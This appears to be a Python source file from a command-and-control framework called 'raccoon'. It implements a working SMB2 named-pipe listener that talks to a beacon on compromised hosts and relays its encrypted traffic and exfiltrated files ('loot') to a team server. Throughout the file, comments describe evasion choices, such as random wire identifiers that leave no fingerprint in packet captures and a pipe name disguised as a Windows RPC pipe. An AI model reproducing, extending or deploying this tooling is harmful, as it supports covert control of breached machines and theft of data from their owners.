"""An SMB2 named-pipe listener for the beacon's SMB transport.

The beacon connects over TCP, walks NEGOTIATE, SESSION_SETUP, TREE_CONNECT
and CREATE, writes one encrypted payload into a named pipe and reads the
answer back out of it. This listener is the far side of that: it carries
the ciphertext to the team server and the answer back, and it holds no
key.

It is **not** a general SMB server, and should not be mistaken for one. It
answers the handshake the beacon performs, in the order the beacon
performs it, and nothing else:

  * SESSION_SETUP is answered with STATUS_SUCCESS and a session id. A real
    server would answer STATUS_MORE_PROCESSING_REQUIRED with an NTLMSSP
    challenge and wait for a Type 3 message. The beacon sends an anonymous
    Type 1 and expects exactly one response, so there is nothing to
    challenge -- but it does mean anything that speaks real SMB will find
    this odd, and a scanner will notice.
  * There is no signing, no encryption, no multi-credit handling, no
    compound requests and no share other than the pipe.

The wire format is taken from measurements of the client rather than from
the SMB2 specification, because the two disagree and the client is what
has to be served:

  * Its WRITE declares a DataOffset of 70 and places the payload at 112.
    A listener that trusted the declared offset would relay 42 bytes of
    the request's own body as ciphertext.
  * It reads the session id from offset 44, having written it at 40; the
    tree id from 40, written at 36; the file id from 132, written at 128.
    So whatever it echoes back is four bytes out of step, and this
    listener validates none of the three. There is one pipe, one session
    and one file, so there is nothing those values could usefully select.

Stdlib only.
"""

import logging
import os
import socket
import socketserver
import struct
import threading
import time
from typing import Optional

from .relay import relay

logger = logging.getLogger("raccoon.listeners.smb")

_CMD_NEGOTIATE = 0x0000
_CMD_SESSION_SETUP = 0x0001
_CMD_LOGOFF = 0x0002
_CMD_TREE_CONNECT = 0x0003
_CMD_TREE_DISCONNECT = 0x0004
_CMD_CREATE = 0x0005
_CMD_CLOSE = 0x0006
_CMD_READ = 0x0008
_CMD_WRITE = 0x0009

_HEADER_LEN = 64

# SMB2_FLAGS_SERVER_TO_REDIR. A client that checks nothing still gets a
# well-formed reply, and anything that does check sees a response rather
# than a request echoed back at it.
_FLAG_RESPONSE = 0x00000001

_DIALECT_202 = 0x0202

# Where the client actually puts its WRITE payload: 64 bytes of header
# plus the 48-byte fixed part of the WRITE request. Measured, not read off
# the declared DataOffset, which the client sets to 70.
_WRITE_DATA_AT = 112

# Where a READ response's buffer starts: 64 bytes of header plus the
# 16-byte fixed part. The client computes `DataOffset - 64` and indexes
# from the header, so this value and the field have to agree.
_READ_DATA_AT = 80

# The client's socket timeout is 15 seconds. A relay allowed to take
# longer would have the listener writing into a socket the beacon has
# already given up on, and the exchange would fail with nothing to show
# for the wait.
_RELAY_TIMEOUT = 10.0


class SmbListener:
    """Serve the beacon's SMB named-pipe exchange on a TCP port."""

    # The client writes a whole result in one message, including loot: a
    # file download is base64 inside the encrypted payload, so this is the
    # ceiling on what can come back over this channel -- roughly 11 MB of
    # file. It bounds one exchange; `max_connections` bounds how many can
    # be in flight, and the two multiply into the worst case a listener
    # can be made to hold.
    max_message = 16 * 1024 * 1024
    max_connections = 32

    def __init__(self, bind_host: str, bind_port: int, *, relay_url: str,
                 pipe_name: str = "msrpc_6e2f"):
        self.relay_url = relay_url
        self.pipe_name = pipe_name
        # Random per listener, and that is the point. These go on the wire
        # in clear text, and the first version of this file put
        # `b"raccoonpipe00001"` in the file id and "RACOON" in the session
        # id -- a fixed string naming the project, in every capture of
        # every exchange. Random values of a plausible shape say nothing.
        #
        # They are never compared against what the client echoes back,
        # because the client picks all three up four bytes past where it
        # writes them. There is one pipe, one session and one file, so
        # there is nothing those values could usefully select anyway.
        self.issued_session_id = os.urandom(8)
        self.issued_tree_id = struct.pack(
            "<I", 1 + int.from_bytes(os.urandom(2), "little"))
        self.issued_file_id = os.urandom(16)
        self._connections = 0
        self._refused = 0
        self._exchanges = 0
        self._in_flight = threading.BoundedSemaphore(self.max_connections)
        self._lock = threading.Lock()
        self._server = _ThreadedServer((bind_host, bind_port), _PipeHandler)
        self._server.listener = self
        self.address = self._server.server_address
        self._thread = None            # type: Optional[threading.Thread]
        self._serving = threading.Event()

    # ── lifecycle ──

    def start(self) -> None:
        if self._thread is not None:
            raise RuntimeError("this listener is already serving")
        self._thread = threading.Thread(target=self.serve_forever,
                                        daemon=True)
        self._thread.start()

    def serve_forever(self) -> None:
        self._serving.set()
        try:
            self._server.serve_forever(poll_interval=0.1)
        finally:
            self._serving.clear()

    def shutdown(self) -> None:
        """Stop serving and release the port. Safe before `start`.

        `BaseServer.shutdown` waits on an event that only `serve_forever`
        ever sets, so calling it on a listener that was built and never
        started blocks for ever. That is not a hypothetical: supervision
        has to be able to tear down a listener whose start failed, and a
        test that built one without starting it hung for four hundred
        seconds before this guard existed.
        """
        if self._serving.is_set():
            self._server.shutdown()
        self._server.server_close()
        if self._thread is not None:
            self._thread.join(timeout=3.0)
            self._thread = None

    # ── observable state ──

    def connections_seen(self) -> int:
        with self._lock:
            return self._connections

    def connections_refused(self) -> int:
        with self._lock:
            return self._refused

    def exchanges_completed(self) -> int:
        with self._lock:
            return self._exchanges

    def _count_connection(self) -> None:
        with self._lock:
            self._connections += 1

    def _count_refusal(self) -> None:
        with self._lock:
            self._refused += 1

    def _count_exchange(self) -> None:
        with self._lock:
            self._exchanges += 1

    def fetch_answer(self, payload: bytes) -> Optional[bytes]:
        """Carry one ciphertext payload to the team server and back.

        The payload is opaque here, in both directions. A failure is None
        and never an exception: the caller is inside a connection handler
        and one bad exchange must not close the service.
        """
        try:
            text = payload.decode("ascii")
        except UnicodeDecodeError:
            logger.debug("smb: payload was not ascii, dropping")
            return None
        answer = relay(text, url=self.relay_url, timeout=_RELAY_TIMEOUT)
        if answer is None:
            return None
        try:
            encoded = answer.encode("ascii")
        except UnicodeEncodeError:
            # The contract above says a failure is None and never an
            # exception, and this method is called from inside a
            # connection handler. The server's payload is base64 and so
            # always ascii, but an encode that can raise in that position
            # is a sharp edge regardless of who is holding it today.
            logger.debug("smb: the server's answer was not ascii, dropping")
            return None
        self._count_exchange()
        return encoded


class _ThreadedServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    # A handler thread must not keep the process alive: the listener is
    # stopped by shutting the server down, and a beacon that wandered off
    # mid-exchange would otherwise hold it open.
    daemon_threads = True

    listener = None                    # type: Optional[SmbListener]


class _PipeHandler(socketserver.BaseRequestHandler):
    """One connection. The beacon opens a fresh one per exchange.

    `pending` is the answer waiting to be read, and it lives here rather
    than on the listener on purpose: two beacons exchange at the same time
    through one listener, and state held in common would splice them
    together, with each decrypting the other's answer.
    """

    def handle(self):
        listener = self.server.listener
        if not listener._in_flight.acquire(blocking=False):
            # A thread per connection with no ceiling is a way to be talked
            # out of memory by anyone who can reach the port. A beacon
            # refused here retries at its next interval; the count is
            # readable, so a panel can show that it happened rather than
            # leaving an operator to wonder why check-ins thinned out.
            listener._count_refusal()
            logger.debug("smb: refused %s, %d connections already in flight",
                         self.client_address, listener.max_connections)
            return
        try:
            self._serve(listener)
        finally:
            listener._in_flight.release()

    def _serve(self, listener):
        listener._count_connection()
        self.request.settimeout(30.0)
        pending = b""
        while True:
            message = self._read_message(listener.max_message)
            if message is None:
                return
            try:
                reply, pending = self._answer(message, pending, listener)
            except Exception as exc:
                # One malformed message must not take the service down for
                # every other beacon, and must not leave this connection in
                # a state where the next message is read at the wrong
                # offset. Dropping the connection is the honest answer.
                logger.debug("smb: dropped a connection from %s: %s",
                             self.client_address, exc)
                return
            if reply is None:
                return
            try:
                self.request.sendall(_netbios(reply))
            except OSError as exc:
                logger.debug("smb: send to %s failed: %s",
                             self.client_address, exc)
                return

    # ── framing ──

    def _read_message(self, cap: int) -> Optional[bytes]:
        head = self._read_exactly(4)
        if head is None:
            return None
        length = struct.unpack(">I", b"\x00" + head[1:4])[0]
        if length < _HEADER_LEN or length > cap:
            # Refused on the header alone, so a declared length cannot make
            # this listener allocate or wait for a body that may never
            # come.
            logger.debug("smb: refused a message declaring %d bytes", length)
            return None
        return self._read_exactly(length)

    def _read_exactly(self, count: int) -> Optional[bytes]:
        buffer = b""
        while len(buffer) < count:
            try:
                chunk = self.request.recv(min(count - len(buffer), 65536))
            except (OSError, socket.timeout):
                return None
            if not chunk:
                return None
            buffer += chunk
        return buffer

    # ── the exchange ──

    def _answer(self, message, pending, listener):
        if message[:4] != b"\xfeSMB":
            raise ValueError("not an SMB2 message")
        command = struct.unpack_from("<H", message, 12)[0]
        message_id = struct.unpack_from("<Q", message, 24)[0]
        header = _header(command, message_id, listener)

        if command == _CMD_NEGOTIATE:
            return header + _negotiate_body(), pending
        if command == _CMD_SESSION_SETUP:
            return header + _session_setup_body(), pending
        if command == _CMD_TREE_CONNECT:
            return header + _tree_connect_body(), pending
        if command == _CMD_CREATE:
            return header + _create_body(listener.issued_file_id), pending
        if command == _CMD_WRITE:
            payload = _write_payload(message, listener.max_message)
            answer = listener.fetch_answer(payload)
            # An empty answer is still a complete exchange as far as the
            # pipe is concerned: the beacon reads zero bytes and treats
            # that as a failed beacon, which is the truth.
            return (header + _write_body(len(payload)),
                    answer if answer is not None else b"")
        if command == _CMD_READ:
            return header + _read_body(pending), b""
        if command in (_CMD_CLOSE, _CMD_TREE_DISCONNECT, _CMD_LOGOFF):
            return header + struct.pack("<HH", 4, 0), pending
        raise ValueError("command 0x%04x is not served" % command)


def _netbios(message: bytes) -> bytes:
    """Prefix the NetBIOS session header the client reads first."""
    return b"\x00" + struct.pack(">I", len(message))[1:] + message


def _header(command: int, message_id: int, listener) -> bytes:
    header = b"\xfeSMB"
    header += struct.pack("<H", _HEADER_LEN)
    header += struct.pack("<H", 0)                  # CreditCharge
    header += struct.pack("<I", 0)                  # Status: SUCCESS
    header += struct.pack("<H", command)
    header += struct.pack("<H", 1)                  # CreditResponse
    header += struct.pack("<I", _FLAG_RESPONSE)
    header += struct.pack("<I", 0)                  # NextCommand
    header += struct.pack("<Q", message_id)
    header += struct.pack("<I", 0)                  # Reserved
    header += listener.issued_tree_id                # 36..40
    header += listener.issued_session_id             # 40..48
    header += b"\x00" * 16                          # Signature: unsigned
    return header


def _negotiate_body() -> bytes:
    body = struct.pack("<H", 65)                    # StructureSize
    body += struct.pack("<H", 0)                    # SecurityMode
    body += struct.pack("<H", _DIALECT_202)
    body += struct.pack("<H", 0)                    # NegotiateContextCount
    body += b"\x00" * 16                            # ServerGuid
    body += struct.pack("<I", 0)                    # Capabilities
    body += struct.pack("<I", 65536)                # MaxTransactSize
    body += struct.pack("<I", 65536)                # MaxReadSize
    body += struct.pack("<I", 65536)                # MaxWriteSize
    body += struct.pack("<Q", _filetime())          # SystemTime
    body += struct.pack("<Q", 0)                    # ServerStartTime
    # The security buffer would carry a SPNEGO token. There is none, and
    # the beacon does not look: it sends an anonymous NTLMSSP Type 1
    # regardless of what is offered.
    body += struct.pack("<H", _HEADER_LEN + 64)     # SecurityBufferOffset
    body += struct.pack("<H", 0)                    # SecurityBufferLength
    body += struct.pack("<I", 0)                    # NegotiateContextOffset
    return body


def _session_setup_body() -> bytes:
    body = struct.pack("<H", 9)                     # StructureSize
    body += struct.pack("<H", 0)                    # SessionFlags
    body += struct.pack("<H", _HEADER_LEN + 8)      # SecurityBufferOffset
    body += struct.pack("<H", 0)                    # SecurityBufferLength
    return body


def _tree_connect_body() -> bytes:
    body = struct.pack("<H", 16)                    # StructureSize
    body += struct.pack("<B", 2)                    # ShareType: PIPE
    body += struct.pack("<B", 0)                    # Reserved
    body += struct.pack("<I", 0)                    # ShareFlags
    body += struct.pack("<I", 0)                    # Capabilities
    body += struct.pack("<I", 0x001F01FF)           # MaximalAccess
    return body


def _create_body(file_id: bytes) -> bytes:
    now = _filetime()
    body = struct.pack("<H", 89)                    # StructureSize
    body += struct.pack("<B", 0)                    # OplockLevel
    body += struct.pack("<B", 0)                    # Flags
    body += struct.pack("<I", 1)                    # CreateAction: OPENED
    body += struct.pack("<Q", now)                  # CreationTime
    body += struct.pack("<Q", now)                  # LastAccessTime
    body += struct.pack("<Q", now)                  # LastWriteTime
    body += struct.pack("<Q", now)                  # ChangeTime
    body += struct.pack("<Q", 0)                    # AllocationSize
    body += struct.pack("<Q", 0)                    # EndOfFile
    body += struct.pack("<I", 0x80)                 # FileAttributes: NORMAL
    body += struct.pack("<I", 0)                    # Reserved2
    body += file_id                                 # 128..144
    body += struct.pack("<I", 0)                    # CreateContextsOffset
    body += struct.pack("<I", 0)                    # CreateContextsLength
    return body


def _write_body(count: int) -> bytes:
    body = struct.pack("<H", 17)                    # StructureSize
    body += struct.pack("<H", 0)                    # Reserved
    body += struct.pack("<I", count)                # Count
    body += struct.pack("<I", 0)                    # Remaining
    body += struct.pack("<H", 0)                    # WriteChannelInfoOffset
    body += struct.pack("<H", 0)                    # WriteChannelInfoLength
    return body


def _read_body(data: bytes) -> bytes:
    body = struct.pack("<H", 17)                    # StructureSize
    body += struct.pack("<B", _READ_DATA_AT)        # DataOffset
    body += struct.pack("<B", 0)                    # Reserved
    body += struct.pack("<I", len(data))            # DataLength
    body += struct.pack("<I", 0)                    # DataRemaining
    body += struct.pack("<I", 0)                    # Reserved2
    return body + data


def _write_payload(message: bytes, cap: int) -> bytes:
    """Take the payload out of a WRITE request the way the client wrote it.

    `Length` is read from the field the client fills correctly; the start
    is the measured one and not the declared `DataOffset`, which the client
    sets to 70 while putting the data at 112.
    """
    if len(message) < _WRITE_DATA_AT:
        raise ValueError("a WRITE request shorter than its own fixed part")
    length = struct.unpack_from("<I", message, 68)[0]
    available = len(message) - _WRITE_DATA_AT
    if length > available:
        raise ValueError("a WRITE declaring %d bytes carried %d"
                         % (length, available))
    if length > cap:
        raise ValueError("a WRITE declaring %d bytes exceeds the cap"
                         % length)
    return message[_WRITE_DATA_AT:_WRITE_DATA_AT + length]


def _filetime() -> int:
    """Now, as a Windows FILETIME: 100ns ticks since 1601-01-01."""
    return int((time.time() + 11644473600) * 10000000)
